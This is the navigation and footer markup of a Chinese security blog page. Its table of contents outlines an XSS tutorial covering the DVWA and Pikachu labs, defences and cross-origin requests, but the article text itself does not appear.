          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">xss介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.0.1.</span> <span class="nav-text">xss存在的原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.0.2.</span> <span class="nav-text">xss的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%88Persistent-XSS%EF%BC%89"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">存储型XSS（Persistent XSS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88Reflected-Cross-Site-Scripting%EF%BC%89"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">反射型XSS（Reflected Cross-Site Scripting）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM%E5%9E%8BXSS%EF%BC%88Document-Object-Model-based-XSS%EF%BC%89"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">DOM型XSS（Document Object Model-based XSS）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E7%A7%8Dxss%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">三种xss区别：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="nav-number">1.0.4.</span> <span class="nav-text">XSS的攻击载荷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="nav-number">1.0.5.</span> <span class="nav-text">XSS漏洞的挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.6.</span> <span class="nav-text">XSS的简单绕过滤和绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa"><span class="nav-number">2.</span> <span class="nav-text">dvwa</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflected%E5%9E%8Bxss"><span class="nav-number">2.1.</span> <span class="nav-text">Reflected型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low%EF%BC%9A"><span class="nav-number">2.1.1.</span> <span class="nav-text">low：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A"><span class="nav-number">2.1.2.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A"><span class="nav-number">2.1.3.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible-%EF%BC%9A"><span class="nav-number">2.1.4.</span> <span class="nav-text">impossible ：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Store%E5%9E%8BXSS"><span class="nav-number">2.2.</span> <span class="nav-text">Store型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible%EF%BC%9A"><span class="nav-number">2.2.3.</span> <span class="nav-text">impossible：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-number">2.3.</span> <span class="nav-text">dom型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low%EF%BC%9A-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">low：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible%EF%BC%9A-1"><span class="nav-number">2.3.4.</span> <span class="nav-text">impossible：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pikachu"><span class="nav-number">3.</span> <span class="nav-text">pikachu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="nav-number">3.1.</span> <span class="nav-text">反射型xss(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="nav-number">3.2.</span> <span class="nav-text">反射型xss(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">3.3.</span> <span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss-1"><span class="nav-number">3.4.</span> <span class="nav-text">dom型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss-x"><span class="nav-number">3.5.</span> <span class="nav-text">dom型xss-x</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-number">3.6.</span> <span class="nav-text">xss之盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">3.7.</span> <span class="nav-text">xss之过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-number">3.8.</span> <span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-number">3.9.</span> <span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-number">3.10.</span> <span class="nav-text">xss之js输出</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">4.</span> <span class="nav-text">xss的防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E5%B8%B8%E7%94%A8Payload"><span class="nav-number">5.</span> <span class="nav-text">xss常用Payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#js%E5%AD%A6%E4%B9%A0"><span class="nav-number">6.</span> <span class="nav-text">js学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOM%E5%AD%A6%E4%B9%A0"><span class="nav-number">7.</span> <span class="nav-text">DOM学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-DOM-%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">7.0.1.</span> <span class="nav-text">1. DOM 的本质</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-DOM-%E8%8A%82%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">7.0.2.</span> <span class="nav-text">2. DOM 节点类型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">8.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"><span class="nav-number">9.</span> <span class="nav-text">跨域请求</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">9.1.</span> <span class="nav-text">解决跨域问题的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CORS-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB"><span class="nav-number">9.1.0.1.</span> <span class="nav-text">CORS (跨域资源共享)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSONP-%E4%BB%85%E9%99%90GET%E8%AF%B7%E6%B1%82"><span class="nav-number">9.1.0.2.</span> <span class="nav-text">JSONP (仅限GET请求)</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="zh1yu"
      src="/images/zh1yu2.jpg">
  <p class="site-author-name" itemprop="name">zh1yu</p>
  <div class="site-description" itemprop="description">花有重开日,人无再少年</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/1182418846@qq.com" title="QQ → 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class=""></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zh1yu</span>
</div>



        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  


<!-- 引入jQuery -->
<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>

<!-- 雪花特效 -->
<script type="text/javascript" src="/js/snow.js"></script>

</body>
</html>
